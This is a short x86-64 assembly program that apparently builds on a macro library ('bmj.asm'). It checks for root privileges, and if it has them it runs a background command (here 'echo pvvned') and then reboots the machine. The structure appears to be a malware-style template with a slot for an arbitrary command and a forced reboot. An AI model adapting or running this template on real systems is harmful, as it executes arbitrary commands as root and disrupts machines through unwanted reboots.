BITS 64
%include "bmj.asm"
section .text
global _start
_start:
    is_root                     ; Returns 1 in RAX if UID=0
    cmp rax, 1                  ; Check above condition
    jne xit                     ; If not rut, quit execution flow with exit(0)
    run_bg "echo pvvned"        ; Desired command to run
    reboot
    xit:                        ; Program exit
    exit 0